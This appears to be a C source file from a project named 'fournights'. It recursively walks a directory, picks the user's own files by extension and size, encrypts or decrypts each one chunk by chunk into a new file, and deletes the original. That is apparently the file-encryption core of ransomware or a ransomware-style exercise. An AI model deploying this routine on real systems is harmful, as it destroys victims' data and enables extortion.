#include "fournights.h"
/**
  * read_file_by_chunk - helper function for traverse_dir
  * @filepath: found a file to encrypt or decrypt
  * @file_info: needed for chmod
  * @file_filter: Needed for temp bufs
 **/
static void read_file_by_chunk(char *filepath, struct stat *file_info,
								file_filter_t *file_filter)
{
	tmp_bufs_t *tmp_bufs;

	tmp_bufs = file_filter->tmp_bufs;
	tmp_bufs->file_info = *file_info;
	do {
		my_strncat(tmp_bufs->filepath, filepath, 0, my_strlen(filepath));
		read_file(tmp_bufs->filepath, file_filter, write_file);
	} while (tmp_bufs->file_offset < tmp_bufs->file_info.st_size);
	tmp_bufs->file_offset = 0;
	tmp_bufs->bytes_read = 0;
	chmod(tmp_bufs->filepath, file_info->st_mode);
	unlink(filepath);
}
/**
  * traverse_dir - Searches through a target directory for all files,
 (* and builds a linked list of those files
  * @dirname: target directory
  * @file_filter: main struct with temporary bufs
  * Return: NULL on error or the struct as a void * NEEDED?
 **/
void *traverse_dir(char *dirname, file_filter_t *file_filter)
{
	size_t len_rootpath, len_filename = 0;
	char *filepath;
	DIR *dir;
	struct dirent *read;
	struct stat file_info;

	dir = opendir(dirname);
	if (!dir)
		return (NULL);
	len_rootpath = my_strlen(dirname);
	filepath = my_calloc(PATH_MAX, sizeof(char));
	my_strncat(filepath, dirname, 0, len_rootpath);
	while ((read = readdir(dir)))
	{
		if (my_strncmp(read->d_name, ".", 1) == 0 ||
			my_strncmp(read->d_name, "..", 2) == 0)
			continue;
		len_filename = my_strlen(read->d_name);
		my_strncat(filepath, read->d_name, len_rootpath, len_filename);
		if (lstat(filepath, &file_info) == -1)
			file_info.st_mode = 0; /* Initialize st_mode on lstat error. */

		if (!(file_info.st_mode & S_IRUSR) || /* user has no read permissions? */
			file_info.st_size > 5368709120 || /* file > 5 GiB? */
			file_filter->uid != file_info.st_uid) /* user doesn't own file? */
			continue;
		if (S_ISDIR(file_info.st_mode) != 0) /* file is dir? */
		{
			my_strncat(filepath, "/", len_rootpath + len_filename, 1);
			/*TODO:convert recursive to iterative?*/
			traverse_dir(filepath, file_filter);
		}
		else if ((search_string(read->d_name, file_filter->file_extensions) != 0) &&
				S_ISREG(file_info.st_mode) != 0) /* file is a regular file? */
			read_file_by_chunk(filepath, &file_info, file_filter);
	}
	free(filepath);
	closedir(dir);
	return (file_filter);
}
